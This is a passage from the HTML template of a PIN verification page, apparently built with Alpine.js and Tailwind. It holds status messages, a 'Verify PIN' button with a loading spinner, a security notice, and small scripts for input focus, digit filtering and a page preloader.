                                x-transition:leave-end="opacity-0 transform -translate-y-2"
                                class="mb-4 p-3 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg text-center text-red-600 dark:text-red-400 text-sm">
                                <i class="fas fa-exclamation-triangle mr-2"></i>
                                <span x-text="errorMessage"></span>
                            </div>

                            <div x-show="successMessage" x-transition:enter="transition ease-out duration-300"
                                x-transition:enter-start="opacity-0 transform -translate-y-2"
                                x-transition:enter-end="opacity-100 transform translate-y-0"
                                x-transition:leave="transition ease-in duration-200"
                                x-transition:leave-start="opacity-100 transform translate-y-0"
                                x-transition:leave-end="opacity-0 transform -translate-y-2"
                                class="mb-4 p-3 bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 rounded-lg text-center text-green-600 dark:text-green-400 text-sm">
                                <i class="fas fa-check-circle mr-2"></i>
                                <span x-text="successMessage"></span>
                            </div>

                            <!-- Submit Button -->
                            <button type="button" @click="submitPin()"
                                :disabled="isProcessing || pin.length !== maxLength"
                                class="w-full py-4 bg-primary-600 hover:bg-primary-700 disabled:bg-gray-300 dark:disabled:bg-gray-600 text-white rounded-xl font-semibold transition-all duration-300 transform hover:scale-105 disabled:transform-none disabled:cursor-not-allowed shadow-lg hover:shadow-xl"
                                :class="{ 'opacity-50 cursor-not-allowed': isProcessing || pin.length !== maxLength }">
                                <template x-if="!isProcessing">
                                    <div class="flex items-center justify-center">
                                        <i class="fas fa-shield-check mr-2"></i>
                                        Verify PIN
                                    </div>
                                </template>
                                <template x-if="isProcessing">
                                    <div class="flex items-center justify-center">
                                        <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
                                            xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                            <circle class="opacity-25" cx="12" cy="12" r="10"
                                                stroke="currentColor" stroke-width="4"></circle>
                                            <path class="opacity-75" fill="currentColor"
                                                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
                                            </path>
                                        </svg>
                                        Verifying...
                                    </div>
                                </template>
                            </button>

                            <!-- Security Notice -->
                            <div class="mt-6 p-4 bg-gray-50 dark:bg-gray-800 rounded-xl">
                                <div class="flex items-center text-sm text-gray-600 dark:text-gray-400">
                                    <i class="fas fa-info-circle mr-2 text-primary-500"></i>
                                    <span>Your PIN is encrypted and secure. We never store your PIN in plain
                                        text.</span>
                                </div>
                            </div>

                            <!-- Account Status Warning -->
                        </div>
                    </div>
                </div>
            </div>

            <script>
                document.addEventListener('DOMContentLoaded', function() {
                    // Disable scroll on mobile for PIN page
                    if (window.innerWidth < 768) {
                        document.body.style.overflow = 'hidden';
                        document.documentElement.style.overflow = 'hidden';
                    }

                    // Focus the desktop PIN input field if visible
                    const pinInput = document.getElementById('desktop-pin');
                    if (pinInput && window.innerWidth >= 768) {
                        pinInput.focus();

                        // Only allow numbers in the PIN input
                        pinInput.addEventListener('keypress', function(e) {
                            const charCode = (e.which) ? e.which : e.keyCode;
                            if (charCode > 31 && (charCode < 48 || charCode > 57)) {
                                e.preventDefault();
                                return false;
                            }
                            return true;
                        });
                    }

                    // Re-enable scroll when leaving the page
                    window.addEventListener('beforeunload', function() {
                        document.body.style.overflow = '';
                        document.documentElement.style.overflow = '';
                    });
                });
            </script>
        </div>

        <!-- Enhanced Page Loading Animation -->
        <script>
            window.onload = function() {
                const preloader = document.querySelector('.page-loading');

                // Add a slight delay to make loading animation more noticeable
                setTimeout(function() {
                    preloader.classList.remove('active');
                    setTimeout(function() {
                        preloader.remove();
                    }, 500);
                }, 800);
            };
        </script>

    </body>

</html>
